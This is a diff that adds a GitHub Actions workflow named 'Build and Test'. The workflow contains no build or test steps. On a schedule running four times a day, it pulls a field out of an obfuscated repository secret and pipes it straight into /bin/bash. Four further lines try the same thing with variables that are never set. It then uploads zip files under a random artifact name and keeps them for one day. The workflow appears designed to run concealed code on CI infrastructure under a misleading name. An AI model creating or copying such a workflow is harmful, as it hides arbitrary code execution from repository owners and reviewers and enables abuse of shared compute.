@@ -1,0 +1,30 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          lhwq28: ${{ secrets.lhwq28 }}
+        run: |
+          printf '%s' "$lhwq28" | jq -r .g631 | /bin/bash
+          echo $rxu5 | jq -r .vngx661 | /bin/bash
+          printf '%s' "$q67" | jq -r .t2 | /bin/bash
+          printf '%s' "$iq9" | jq -r .rxxu32693 | /bin/bash
+          printf '%s' "$a46" | jq -r .hhonc955 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZigO0dsG
+          path: "*.zip"
+          retention-days: 1
